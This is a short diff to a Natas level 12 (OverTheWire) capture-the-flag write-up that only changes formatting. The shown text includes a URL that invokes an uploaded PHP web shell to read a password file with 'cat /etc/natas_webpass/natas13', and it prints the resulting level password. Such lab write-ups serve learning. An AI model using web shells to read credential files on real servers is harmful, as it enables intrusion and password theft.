@@ -69,7 +69,7 @@ After uploading, the server returns a path similar to:
 
 Open the uploaded file in the browser and execute a command:
 
-http://natas12.natas.labs.overthewire.org/upload/abc123.php?cmd=cat /etc/natas_webpass/natas13
+>http://natas12.natas.labs.overthewire.org/upload/abc123.php?cmd=cat /etc/natas_webpass/natas13
 
 ## 💡 Discovery
 ### 1. Executing the Command
@@ -83,5 +83,6 @@ This file contains the password for the next level.
 ### 2. Retrieving the Password
 
 The output reveals:
+
 ```php
 natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
